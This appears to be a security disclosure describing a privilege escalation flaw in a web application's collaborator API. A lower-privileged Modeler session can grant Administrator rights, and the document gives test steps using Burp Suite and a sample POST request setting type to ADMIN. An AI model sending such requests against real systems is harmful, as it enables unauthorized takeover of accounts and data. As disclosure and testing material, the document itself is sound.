## Use case

The Modeler role in the web application was able to grant Administrator access to any user by exploiting a lack of proper role validation in the backend API, which could lead to unauthorized access and control over the model.

## Steps to test

1. Create two accounts: one with Admin privileges and another with a lower privilege (Viewer or Modeler).
2. Perform an Admin-only action using the Admin account and capture the request in Burp Suite.
3. Replace the Admin session with the lower-privileged account session in the captured request.
4. Send the modified request to the backend API endpoint POST /api/models/{MODEL_ID}/collaborators with the email and user ID of the target account, setting the type to ADMIN.

## Commands

```text
POST /api/models/{MODEL_ID}/collaborators HTTP/1.1
Host: example.com
Authorization: Bearer {MODELER_SESSION_TOKEN}
Content-Type: application/json
{ "email": "target@example.com", "user_id": "TARGET_USER_ID", "type": "ADMIN" }
POST /api/models/{MODEL_ID}/collaborators
```
